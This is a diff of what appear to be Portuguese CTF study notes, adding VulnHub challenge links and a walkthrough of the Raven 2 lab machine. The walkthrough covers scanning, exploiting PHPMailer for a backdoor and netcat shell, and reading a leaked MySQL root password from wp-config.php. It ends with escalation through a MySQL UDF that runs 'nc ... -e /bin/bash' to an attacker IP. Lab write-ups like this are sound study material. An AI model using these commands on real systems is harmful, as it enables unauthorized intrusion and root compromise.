@@ -12,7 +12,9 @@ Desafio 9 - https://www.vulnhub.com/entry/dc-1-1,292/#download	<br/>
 Desafio 10 - https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/	<br/>
 Desafio 11 - https://vulnhub.com/entry/goldeneye-1,240/	<br/>
 Desafio 12 - https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/	<br/>
-Desafio 13 - 
+Desafio 13 - https://www.vulnhub.com/entry/raven-2,269/		</br>
+Desafio 14 - https://www.vulnhub.com/entry/the-library-1,334/ 	</br>
+Desafio 15 - </br>
 <br/>**--VM--**
 	
 	
@@ -465,3 +467,71 @@ Desafio 13 -
 		
 		
 
+ <h3>Dia 13 			19/9/2020</h3>
+
+	*scan
+		nmap -sV -v 
+		
+	*index
+		dirb http://ip -d /usr/share/wordlists/dirb/big.txt
+			/vendor
+				phpmailer
+					searchsploit phpmailer -> 40974.py
+						
+		*site -> contact
+			contact.php
+			
+			*40974.py
+				target: http://ip/contact.php
+				backdoor:
+				payload:meu_ip  porta
+				fiealds: -X/var/www/html/nome_backdor 
+				# -*- coding:utf-8 -*-
+					python 40974.py
+				
+		*nc -lnvp porta
+		
+		*ip/backdoor.php
+		
+		*shell 
+			python -c 'import pty;pty.spawn("/bin/sh")'
+			
+		*ps aux
+			mysql rodando como root
+
+		*/var/www/html/wordpress -> cat wp-config.php
+				define('DB_NAME', 'wordpress');
+
+				/** MySQL database username */
+				define('DB_USER', 'root');
+
+				/** MySQL database password */
+				define('DB_PASSWORD', 'R@v3nSecurity');
+
+		*mysql -u root -p  -> -u usuario, -p pedir senha
+		senha: R@v3nSecurity
+			
+		* gcc -g -c 1518.c
+				ls -> 1518.o
+				gcc -g -shared -Wl,-soname,becomysql.so -o becomysql.so 1518.o -lc
+					ls -l ->becomysql.so
+		
+		*kali: python -m SimpleHTTPServer 8080			
+			*alvo com myqsl: \! sh -> abrir uma shell
+				wget http:_ip_:8080/becomysql.so
+				exit
+		show databases;
+		use mysql;
+		create table beco(line blob);
+		
+		insert into beco values(load_file('diretorio/becomysql.so'));
+				insert into beco values(load_file('/tmp/becomysql.so'));
+				
+		select * from beco into dumpfile '/usr/lib/becomysql.so';
+		
+		 create function do_system returns integer soname 'becomysql.so';
+		
+		select * from mysql.func;
+
+		*kali -> nc -lnvp 80
+		select do_system('nc 192.168.100.4 80 -e /bin/bash ');
